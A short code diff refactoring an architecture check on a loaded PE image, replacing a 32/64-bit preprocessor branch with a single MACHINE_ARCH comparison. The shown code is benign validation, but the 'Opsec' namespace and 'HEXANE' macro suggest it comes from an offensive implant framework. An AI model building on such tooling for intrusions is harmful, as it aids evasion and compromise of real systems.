@@ -154,18 +154,11 @@ namespace Opsec {
     BOOL SeImageCheckArch(const _executable *const image) {
         HEXANE
 
-#if _WIN64
-        if (image->nt_head->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
+        if (image->nt_head->FileHeader.Machine != MACHINE_ARCH) {
             ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
             return false;
         }
 
-#else
-        if (image->nt_head->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
-            ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
-            return false;
-        }
-#endif
         return true;
     }
 
